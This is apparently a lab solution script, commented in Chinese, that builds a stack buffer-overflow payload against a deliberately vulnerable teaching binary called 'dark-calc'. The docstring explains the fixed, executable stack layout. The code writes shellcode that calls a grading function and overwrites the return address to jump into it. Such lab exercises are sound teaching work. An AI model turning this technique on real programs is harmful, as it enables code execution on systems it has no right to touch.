#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc (栈空间执行).

dark-calc 通过 init_fixed_stack()（.init_array 构造函数）在固定地址
0x721000000000 处 mmap 了一块 8 MiB、PROT_READ|PROT_WRITE|PROT_EXEC 的
内存，并由 __wrap_main 把 rsp 切换过去，因此程序运行时使用的调用栈：

  - 地址固定（不受 ASLR 影响）
  - 拥有可执行权限（不受 NX 影响）

布局（调试可得，且由 init_fixed_stack 的实现唯一确定）：
  fixed_stack_top = 0x721000000000 + 0x801000 = 0x721000801000
  __wrap_main: rsp = 0x721000801000, call main
  main:        push rbp; ...; call input
  input:       push rbp; mov rbp, rsp; sub rsp, 0x10
    => input 的 rbp = 0x721000800fe0
    => expression 缓冲区 = rbp - 0x10 = 0x721000800fd0
    => 返回地址位于 rbp + 8 = 0x721000800fe8（距缓冲区起点 24 字节）

于是把一小段机器码写在缓冲区起点，把返回地址改写为缓冲区地址
0x721000800fd0，input() 返回时 rip 即指向栈上我们编写的机器码。

机器码完成：edi = 4; 调用 0x401a87 处的 grade_eval(4)。
因为栈地址与代码段相距超过 32 位，call rel32 够不到，
所以用 movabs 把绝对地址装入 rax 再 call rax。
"""
import sys


def p64(x: int) -> bytes:
    return x.to_bytes(8, "little")


GRADE_EVAL = 0x401A87          # dark-calc 中 grade_eval 的地址
BUF_ADDR = 0x721000800FD0      # input() 栈帧上 expression 缓冲区的固定地址

shellcode = b"\xbf\x04\x00\x00\x00"      # movl $0x4, %edi
shellcode += b"\x48\xb8" + p64(GRADE_EVAL)  # movabsq $grade_eval, %rax
shellcode += b"\xff\xd0"                  # callq *%rax

assert b"\x0a" not in shellcode           # gets() 会在换行符处停止

payload = shellcode
payload += b"A" * (24 - len(shellcode))  # 填满缓冲区 + 保存的 rbp
payload += p64(BUF_ADDR)                  # 返回地址 -> 栈上的机器码

sys.stdout.buffer.write(payload)
